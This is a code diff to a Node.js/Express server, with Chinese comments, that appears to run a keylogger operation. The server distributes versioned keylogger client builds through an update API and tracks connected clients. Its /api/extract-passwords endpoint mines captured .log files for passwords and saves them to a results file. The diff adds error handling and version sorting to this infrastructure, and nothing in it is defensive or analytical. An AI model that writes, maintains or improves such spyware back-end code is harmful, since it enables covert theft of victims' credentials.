@@ -1100,9 +1100,9 @@ class ClientManager {
 
     broadcastClientUpdate(client, eventType) {
         const message = JSON.stringify({
-            type: 'client_updated',
-            event: eventType,
-            client: this.getClientInfo(client)
+        type: 'client_updated',
+        event: eventType,
+        client: this.getClientInfo(client)
         });
 
         const toRemove = [];
@@ -1479,6 +1479,12 @@ app.get('/api/update/get_version', asyncHandler(async (req, res) => {
         );
 
         const versions = [];
+        const existingRows = await executeWithRetry(
+            'SELECT version, is_active FROM client_versions',
+            []
+        );
+        const activeVersionMap = new Map(existingRows.map(row => [row.version, !!row.is_active]));
+
         for (const file of keyloggerFiles) {
             const versionMatch = file.filename.match(/v(\d+\.\d+\.\d+)/i);
             if (versionMatch) {
@@ -1490,9 +1496,17 @@ app.get('/api/update/get_version', asyncHandler(async (req, res) => {
                     'INSERT IGNORE INTO client_versions (version, download_url, is_active) VALUES (?, ?, FALSE)',
                     [version, downloadUrl]
                 );
-                versions.push({ version, downloadUrl, filename: file.filename });
+
+                versions.push({
+                    version,
+                    downloadUrl,
+                    filename: file.filename,
+                    is_active: activeVersionMap.get(version) || false
+                });
             }
         }
+
+        versions.sort((a, b) => compareVersions(b.version, a.version));
 
         // 2. 缓存起来并返回
         versionCache.set(cacheKey, JSON.parse(JSON.stringify(versions)));
@@ -2075,12 +2089,13 @@ function extractPasswordsFromLog(content, filename) {
 
 
 app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
-    const allFiles = await alistClient.listFiles(alistClient.basePath, true);
-    const logFiles = allFiles.filter(file => file.filename.endsWith('.log'));
-    
-    if (logFiles.length === 0) return res.json({ success: true, count: 0 });
+    try {
+        const allFiles = await alistClient.listFiles(alistClient.basePath, true);
+        const logFiles = allFiles.filter(file => file.filename.endsWith('.log'));
+        
+        if (logFiles.length === 0) return res.json({ success: true, count: 0 });
 
-    const currentFileStates = new Map();
+        const currentFileStates = new Map();
     for (const file of logFiles) {
         const mtime = file.uploadTime ? new Date(file.uploadTime).getTime() : Date.now();
         currentFileStates.set(file.filename, { mtime });
@@ -2149,7 +2164,7 @@ app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
         return !isPasswordBlacklisted(item.password);
     });
 
-    const uniquePasswords = [];
+    let uniquePasswords = [];
     const seenSet = new Set();
     for (const item of filteredPasswords) {
         const key = `${item.file}|${item.password}`;
@@ -2159,8 +2174,7 @@ app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
         }
     }
     uniquePasswords.sort((a, b) => (b.timestamp || '').localeCompare(a.timestamp || ''));
-    //丢弃密码为空的条目
-uniquePasswords = uniquePasswords.filter(item => item.password && item.password.trim() !== '');
+    // 丢弃密码为空的条目
     uniquePasswords = uniquePasswords.filter(item => item.password && item.password.trim() !== '');
     const resultFilename = 'extracted_passwords.txt';
     const resultContent = uniquePasswords.map((item, index) => {
@@ -2184,6 +2198,10 @@ uniquePasswords = uniquePasswords.filter(item => item.password && item.password.
     }
 
     res.json({ success: true, count: uniquePasswords.length, passwords: uniquePasswords });
+    } catch (error) {
+        logger.error('提取密码失败', { error: error.message, stack: error.stack });
+        res.status(500).json({ success: false, error: '提取密码失败: ' + error.message });
+    }
 }));
 
 app.post('/api/blacklist/test', asyncHandler(async (req, res) => {
